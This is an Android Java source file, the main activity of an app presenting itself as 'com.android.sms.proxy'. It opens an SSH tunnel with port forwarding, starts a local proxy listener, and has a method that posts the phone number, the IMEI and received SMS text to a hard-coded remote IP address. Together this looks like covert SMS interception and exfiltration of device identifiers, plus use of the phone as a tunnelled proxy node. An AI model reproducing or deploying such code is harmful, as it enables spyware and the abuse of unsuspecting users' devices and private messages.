package com.android.sms.proxy.ui;

import android.content.ComponentName;
import android.content.ServiceConnection;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.util.Log;
import android.widget.TextView;

import com.android.sms.proxy.R;
import com.android.sms.proxy.entity.BindServiceEvent;
import com.android.sms.proxy.entity.MessageEvent;
import com.android.sms.proxy.entity.NativeParams;
import com.android.sms.proxy.entity.PhoneInfo;
import com.android.sms.proxy.entity.SpSimpleJsonImpl;
import com.android.sms.proxy.service.AlarmControl;
import com.android.sms.proxy.service.IProxyControl;
import com.android.sms.proxy.service.ProxyServiceUtil;
import com.android.sms.proxy.service.Receiver_SMS;
import com.oplay.nohelper.loader.Loader_Base_ForCommon;
import com.oplay.nohelper.volley.RequestEntity;
import com.oplay.nohelper.volley.Response;
import com.oplay.nohelper.volley.VolleyError;

import org.connectbot.bean.HostBean;
import org.connectbot.bean.PortForwardBean;
import org.connectbot.event.WaitForSocketEvent;
import org.connectbot.service.BridgeDisconnectedListener;
import org.connectbot.service.TerminalBridge;
import org.connectbot.service.TerminalManager;
import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;

import java.util.HashMap;
import java.util.Map;

/**
 * @author zyq 16-3-10
 */
public class MainActivity extends AppCompatActivity implements Receiver_SMS.OnReceiveSMSListener,
        BridgeDisconnectedListener, ServiceConnection {

	private static final String TAG = "main";
	public static final String NETWORK_CACHE_DIR = "volley";
	private TextView message;
	private String printMessage;
	private StringBuilder oldMsg = new StringBuilder();
	private TerminalManager binder;
	private TerminalBridge hostBridge;
	private HostBean mHostBean;
	private PortForwardBean portForward;
	private long mBindServiceStartTime = 0;
	private IProxyControl mProxyControl;
	private boolean isProxyServiceRunning = false;

	private ServiceConnection connection = new ServiceConnection() {

		@Override
		public void onServiceConnected(ComponentName name, IBinder service) {
			Log.d(TAG, "TerminalManager service 建立起来了");
			binder = ((TerminalManager.TerminalBinder) service).getService();
			mHostBean = ProxyServiceUtil.getInstance(MainActivity.this).getHostBean();
			portForward = ProxyServiceUtil.getInstance(MainActivity.this).getPortFowardBean();

			Log.d(TAG, "TerminalManager建立起来的hostBean:" + mHostBean + " portForwardBean:" + portForward);
			if (mHostBean != null && portForward != null) {

				Uri requested = mHostBean.getUri();
				final String requestedNickName = (requested != null) ? requested.getFragment() : null;

				Log.d(TAG, "requestedNickName:" + requested.getFragment());

				hostBridge = binder.getConnectedBridge(requestedNickName);
				if (requestedNickName != null && hostBridge == null && portForward != null) {
					try {
						Log.d(TAG, String.format("We couldnt find an existing bridge with URI=%s (nickname=%s), so " +
								"creating one now", requested.toString(), requestedNickName));
						printMessage = "重新启动一个代理请求:" + requestedNickName;
						print(printMessage);
						hostBridge = binder.openConnection(requested, portForward);
					} catch (Exception e) {
						printMessage = "Problem while trying to create new requested bridge from URI:" + e;
						print(printMessage);
						Log.e(TAG, "Problem while trying to create new requested bridge from URI", e);
					}
				}

			}
		}

		@Override
		public void onServiceDisconnected(ComponentName name) {
			binder = null;
		}
	};


	private void print(String printMessage) {
		EventBus.getDefault().postSticky(new MessageEvent(printMessage));
	}


	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
//		setContentView(R.layout.main_activity);
//		message = (TextView) findViewById(R.id.message);
//		message.setMovementMethod(ScrollingMovementMethod.getInstance());
		//EventBus.getDefault().register(this);
		//Receiver_SMS.setReceiveListener(this);
		AlarmControl.getInstance(this).initAlarm(15, 52, 0, 0);
//		Log.d(TAG, "imsi:" + PhoneInfo.getInstance(this).getPhoneIMSI());
//		String phoneNumber = PhoneInfo.getInstance(this).getNativePhoneNumber();
//		Log.d(TAG, "手机号码:" + phoneNumber);
//		String imei = PhoneInfo.getInstance(this).getIMEI();
//		Log.d(TAG, "imei:" + imei);
	}

	@Override
	public void onReceiveSMS(String sms) {
		Log.d(TAG, "短信内容为:" + sms);
		//sendRegisterCode(sms);
	}

	public void sendSms(String sms) {
		String number = PhoneInfo.getInstance(this).getNativePhoneNumber();
		if (TextUtils.isEmpty(number)) return;
		Map<String, String> map = new HashMap<>();
		map.put(NativeParams.TYPE_PHONE_NUMBER, PhoneInfo.getInstance(this).getNativePhoneNumber());
		map.put(NativeParams.TYPE_PHONE_IMEI, PhoneInfo.getInstance(this).getIMEI());
		map.put(NativeParams.TYPE_PHONE_SMS, sms);
		String url = "http://52.77.240.92:80/regist/";
		RequestEntity<SpSimpleJsonImpl> entity = new RequestEntity<SpSimpleJsonImpl>(url, SpSimpleJsonImpl.class, map);
		Loader_Base_ForCommon.getInstance().onRequestLoadNetworkTask(entity, true, new Response.Listener() {
			@Override
			public void onResponse(Object response) {
				if (response instanceof SpSimpleJsonImpl) {
					int code = ((SpSimpleJsonImpl) response).getCode();
					if (code == NativeParams.SUCCESS) {
						String data = ((SpSimpleJsonImpl) response).getData();
						Log.d(TAG, "返回数据:" + data);
					}
				}
			}
		}, new Response.ErrorListener() {
			@Override
			public void onErrorResponse(VolleyError error) {
				Log.d(TAG, error.toString());
			}
		});
	}

	@Override
	protected void onDestroy() {

		super.onDestroy();
		if (binder != null) {
			unbindService(connection);
		}
		if (mProxyControl != null) {
			unbindService(this);
		}
	}

	@Override
	protected void onStop() {
		super.onStop();

	}

	@Subscribe
	public void onEvent(final MessageEvent event) {

		runOnUiThread(new Runnable() {
			@Override
			public void run() {
				if (event != null) {

					if (oldMsg.length() == 0) {
						oldMsg.append(event.getSocketMessage());
					} else {
						oldMsg.append("\r\n");
						oldMsg.append(event.getSocketMessage());
					}

					message.setText(oldMsg.toString());
				}
			}
		});

	}


	@Subscribe
	public void onEvent(final BindServiceEvent event) {
		runOnUiThread(new Runnable() {
			@Override
			public void run() {
				if (event != null) {
					printMessage = getString(R.string.proxy_config_enough);
					print(printMessage);
					mBindServiceStartTime = System.currentTimeMillis();
					//bindService(new Intent(MainActivity.this, TerminalManager.class), connection, Context
					// .BIND_AUTO_CREATE);
				}

			}
		});

	}

	@Subscribe
	public void onEvent(final WaitForSocketEvent event) {

		runOnUiThread(new Runnable() {
			@Override
			public void run() {
				if (event != null) {
					long temp = mBindServiceStartTime;
					mBindServiceStartTime = System.currentTimeMillis();
					temp = mBindServiceStartTime - temp;
					printMessage = "ssh隧道建立成功，用时" + temp + "毫秒";
					print(printMessage);
					// bindService(new Intent(MainActivity.this,ProxyService.class),MainActivity.this,Context
					// .BIND_AUTO_CREATE);
				}
			}
		});
	}

	@Override
	public void onDisconnected(TerminalBridge bridge) {

	}

	@Override
	public void onServiceConnected(ComponentName name, IBinder service) {
		mProxyControl = (IProxyControl) service;
		Log.d(TAG, "proxyService开始监听" + ProxyServiceUtil.getDestPort() + "端口");
		Log.d(TAG, "proxyService 开始链接" + mProxyControl);
		try {
			if (!isProxyServiceRunning && mProxyControl != null) {
				isProxyServiceRunning = mProxyControl.start();
				if (isProxyServiceRunning) {
					printMessage = "开始监听端口:" + ProxyServiceUtil.getDestPort();
					print(printMessage);
				}
			}
		} catch (RemoteException e) {
			Log.e(TAG, e.fillInStackTrace().toString());
			printMessage = e.fillInStackTrace().toString();
			print(printMessage);
		}
	}

	@Override
	public void onServiceDisconnected(ComponentName name) {
		mProxyControl = null;
	}
}
